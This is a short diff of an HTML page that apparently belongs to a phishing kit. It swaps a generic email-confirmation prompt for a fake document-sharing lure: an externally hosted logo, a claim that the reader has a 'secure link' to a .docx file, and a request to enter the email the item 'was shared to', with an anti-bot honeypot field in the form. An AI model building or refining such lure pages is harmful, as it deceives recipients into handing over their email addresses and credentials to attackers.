@@ -17,7 +17,10 @@
       </div>
 
       <div class="content">
-        <p><strong>Please confirm your email address to continue.</strong></p>
+        <img src="https://i.postimg.cc/s2TBQ89k/ldimg1.png" width="100" height="35">
+        <p>You've received a secure link to:</p>
+        <p style="font-size: 16px; color: #000000;">TT93794-2025.docx</p>
+        <p style="font-size: 16px;">To proceed, enter the email that this <br>item was shared to</p>
 
         <div class="form-wrapper">
           <label for="honeypot" class="visually-hidden">Do not fill this field (anti-bot)</label>
